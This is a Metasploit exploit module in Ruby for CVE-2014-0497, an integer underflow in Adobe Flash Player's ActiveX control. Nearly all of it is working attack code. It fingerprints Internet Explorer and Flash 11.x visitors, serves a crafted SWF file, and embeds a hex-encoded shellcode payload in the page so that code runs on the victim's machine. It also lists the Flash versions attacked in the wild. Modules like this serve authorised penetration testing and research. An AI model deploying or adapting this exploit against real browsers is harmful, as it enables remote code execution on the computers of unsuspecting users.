##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Adobe Flash Player Integer Underflow Remote Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability found in the ActiveX component of Adobe Flash Player
        before 12.0.0.43. By supplying a specially crafted swf file it is possible to trigger an
        integer underflow in several avm2 instructions, which can be turned into remote code
        execution under the context of the user, as exploited in the wild in February 2014. This
        module has been tested successfully with Adobe Flash Player 11.7.700.202 on Windows XP
        SP3, Windows 7 SP1 and Adobe Flash Player 11.3.372.94 on Windows 8 even when it includes
        rop chains for several Flash 11 versions, as exploited in the wild.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown',     # vulnerability discovery and exploit in the wild
          'juan vazquez' # msf module
        ],
      'References'     =>
        [
          [ 'CVE', '2014-0497' ],
          [ 'OSVDB', '102849' ],
          [ 'BID', '65327' ],
          [ 'URL', 'http://helpx.adobe.com/security/products/flash-player/apsb14-04.html' ],
          [ 'URL', 'http://blogs.technet.com/b/mmpc/archive/2014/02/17/a-journey-to-cve-2014-0497-exploit.aspx' ],
          [ 'URL', 'http://blog.vulnhunt.com/index.php/2014/02/20/cve-2014-0497_analysis/' ]
        ],
      'Payload'        =>
        {
          'Space' => 1024,
          'DisableNops' => true
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f',
          'Retries'              => false
        },
      'Platform'       => 'win',
      # Versions targeted in the wild:
      # [*] Windows 8:
      #   11,3,372,94, 11,3,375,10, 11,3,376,12, 11,3,377,15, 11,3,378,5, 11,3,379,14
      #   11,6,602,167, 11,6,602,171 ,11,6,602,180
      #   11,7,700,169, 11,7,700,202, 11,7,700,224
      # [*] Before windows 8:
      #   11,0,1,152,
      #   11,1,102,55, 11,1,102,62, 11,1,102,63
      #   11,2,202,228, 11,2,202,233, 11,2,202,235
      #   11,3,300,257, 11,3,300,273
      #   11,4,402,278
      #   11,5,502,110, 11,5,502,135, 11,5,502,146, 11,5,502,149
      #   11,6,602,168, 11,6,602,171, 11,6,602,180
      #   11,7,700,169, 11,7,700,202
      #   11,8,800,97, 11,8,800,50
     'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :clsid   => "{D27CDB6E-AE6D-11cf-96B8-444553540000}",
          :method  => "LoadMovie",
          :os_name => Msf::OperatingSystems::WINDOWS,
          :ua_name => Msf::HttpClients::IE,
          :flash   => lambda { |ver| ver =~ /^11\./ }
        },
      'Targets'        =>
        [
          [ 'Automatic', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Feb 5 2014",
      'DefaultTarget'  => 0))
  end

  def exploit
    @swf = create_swf
    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri =~ /\.swf$/
      print_status("Sending SWF...")
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})
      return
    end

    print_status("Sending HTML...")
    tag = retrieve_tag(cli, request)
    profile = get_profile(tag)
    profile[:tried] = false unless profile.nil? # to allow request the swf
    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
  end

  def exploit_template(cli, target_info)

    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    shellcode = get_payload(cli, target_info).unpack("H*")[0]

    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="id=<%=shellcode%>" />
    <param name="Play" value="true" />
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join( Msf::Config.data_directory, "exploits", "CVE-2014-0497", "Vickers.swf" )
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }

    swf
  end

end